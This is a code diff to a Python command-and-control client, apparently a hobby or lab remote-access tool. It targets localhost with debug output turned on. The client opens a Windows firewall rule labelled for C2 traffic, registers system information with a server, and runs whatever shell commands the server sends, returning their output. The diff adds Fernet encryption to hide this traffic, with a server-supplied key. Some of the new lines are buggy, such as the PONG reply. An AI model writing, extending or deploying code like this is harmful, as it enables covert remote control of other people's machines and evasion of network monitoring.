@@ -6,6 +6,8 @@ import platform
 import ctypes
 import getpass
 import sys
+from cryptography.fernet import Fernet
+import base64
 
 SERVER='localhost'
 SERVER_PORT=9999
@@ -14,6 +16,8 @@ FIREWALL_NAME="Allow Python C2 Outbound"
 BUFFER_SIZE=4096
 DEBUG=True
 TIMEOUT_TIME=15
+
+key = ""
 
 class style():
   RED       = '\033[31m'
@@ -47,7 +51,8 @@ def close_connection(client_sock, msg="no message specified"):
         if DEBUG:
             print(f"Sending: {msg_to_send}")
         # Server may or may not receive this, as it only listens for KILL_R events after KILL. That's okay.
-        client_sock.send(msg_to_send.encode())
+        #client_sock.send(msg_to_send.encode())
+        client_sock.send(encrypt_string(msg_to_send).encode())
     except Exception:
         pass  # Avoid double-fault if socket is already closed
     finally:
@@ -138,7 +143,20 @@ def open_firewall():
         if DEBUG:
             print(f"Error when setting up firewall: {str(e)}")
 
+def encrypt_string(msg):
+    global key
+    cipher = Fernet(key)
+    encrypted = cipher.encrypt(msg.encode())
+    return base64.b64encode(encrypted).decode()
+
+def decrypt_string(msg):
+    global key
+    cipher = Fernet(key)
+    decrypted = base64.b64decode(msg)
+    return cipher.decrypt(decrypted).decode()
+
 def main():
+    global key
 
     # Gather basic system info
     sys_os = platform.system()
@@ -166,12 +184,22 @@ def main():
         print(f"Connected to server {SERVER} {SERVER_PORT}")
     
     try:
+        # Receive key. Don't decrypt
+        response = client_sock.recv(BUFFER_SIZE).decode()
+        if DEBUG:
+            print(f"Received: {response}")
+        if not response.startswith("INIT"):
+            raise ValueError("Did not receive expected INIT from server")
+        key = response[len("INIT "):]
+        
         # Send register message to server
         # client_sock.send(b"Hello Server!") # b before makes it bytes (needed for network), or do "a".encode()
         if DEBUG:
             print(f"Sending: {sys_info}")
-        client_sock.send(sys_info.encode())
+        #client_sock.send(sys_info.encode())
+        client_sock.send(encrypt_string(sys_info).encode())
         response = client_sock.recv(BUFFER_SIZE).decode()
+        response = decrypt_string(response)
         if DEBUG:
             print(f"Received: {response}")
         if not response.startswith("REG_R"):
@@ -180,7 +208,8 @@ def main():
         # Await input from server and execute
         while True:
             try:
-                response = client_sock.recv(BUFFER_SIZE).decode().strip()
+                response = client_sock.recv(BUFFER_SIZE).decode()
+                response = decrypt_string(response)
                 if not response:
                     raise ConnectionResetError  # Socket closed on server side
                 if DEBUG:
@@ -199,7 +228,8 @@ def main():
                     output = f"CMD_R {result.returncode} | {result.stdout.strip()} | {result.stderr.strip()}"
                     if DEBUG:
                         print(f"Sending: {output}")
-                    client_sock.send(output.encode())
+                    #client_sock.send(output.encode())
+                    client_sock.send(encrypt_string(output).encode())
 
                 if response.startswith("KILL"):
                     close_connection(client_sock,"server requested kill")
@@ -207,13 +237,15 @@ def main():
                 if response.startswith("PING"):
                     if DEBUG:
                         print(f"Sending: PONG")
-                    client_sock.send("PONG".encode())
+                    #client_sock.send("PONG".encode())
+                    client_sock.send(encrypt_string("PONG".encode()))
 
             except subprocess.TimeoutExpired:
                 output = "CMD_R 124 | Command timed out | Command timed out"
                 if DEBUG:
                     print(f"Sending: {output}")
-                client_sock.send(output.encode())
+                #client_sock.send(output.encode())
+                client_sock.send(encrypt_string(output).encode())
             except Exception as e:
                 #print(f"Unexpected error: {e}")
                 close_connection(client_sock, f"Handled Exception: {str(e)}")
